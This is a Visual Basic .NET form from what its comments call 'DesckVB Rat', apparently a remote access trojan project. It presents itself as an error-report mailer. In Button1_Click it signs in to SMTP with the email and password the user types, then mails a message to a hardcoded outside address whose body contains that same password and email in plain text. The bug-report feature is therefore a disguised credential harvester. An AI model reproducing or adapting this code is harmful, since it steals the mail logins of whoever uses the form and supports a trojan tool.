Imports System.Net.Mail
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.IO
Imports System.ComponentModel
Imports System.Windows.Forms.Form
Imports System.Windows.Forms.Label
Imports System.Windows.Forms.TextBox
Imports System.Windows.Forms
Imports System.Windows.Forms.MessageBox 'para manter todas as messagebox em superior ou forme na hora de ser exebidas

'Coded pjoao1
'v2
Public Class Emailreport

    Private Sub Email_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try

        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Email_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        Try
            Me.TextBox1.Clear() 'linpar
        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Email_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            Me.TextBox1.Clear() 'linpar
        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.TextBox1.Enabled = False
        Me.TextBox2.Enabled = False
        Me.TextBox3.Enabled = False
        Me.TextBox4.Enabled = False
        Me.ComboBox1.Enabled = False

        Try 'report erros do DesckVB Rat por email hotmail/gmail

            Dim Mail As New MailMessage
            Dim SMTP As New SmtpClient(ComboBox1.Text)
            Mail.To.Add("gvtgvt@outlook.com.br")
            Mail.From = New MailAddress(TextBox2.Text)
            Mail.Body = Me.TextBox1.Text & " " & TextBox3.Text & " " & TextBox2.Text
            Mail.Subject = TextBox4.Text
            SMTP.EnableSsl = True
            SMTP.Credentials = New System.Net.NetworkCredential(Me.TextBox2.Text, Me.TextBox3.Text)
            SMTP.Port = 587
            SMTP.Send(Mail)

            MessageBox.Show("Email Enviado", "Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        Catch ex As Exception 'clean erros
            Form1.ListBox1.Items.Add("Erro Em Envio De Reports erros Email !")
            MessageBox.Show("Erro !! Not send", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error)
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try

        Me.TextBox1.Enabled = True
        Me.TextBox2.Enabled = True
        Me.TextBox3.Enabled = True
        Me.TextBox4.Enabled = False
        Me.ComboBox1.Enabled = True
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        'esconder palavas ao digitar por ?
        If Me.CheckBox1.Checked = True Then
            Me.TextBox2.PasswordChar = "?"
        Else
            Me.TextBox2.PasswordChar = String.Empty
        End If
    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        'esconder palavas ao digitar por ?
        If Me.CheckBox2.Checked = True Then
            Me.TextBox3.PasswordChar = "?"
        Else
            Me.TextBox3.PasswordChar = String.Empty
        End If
    End Sub
End Class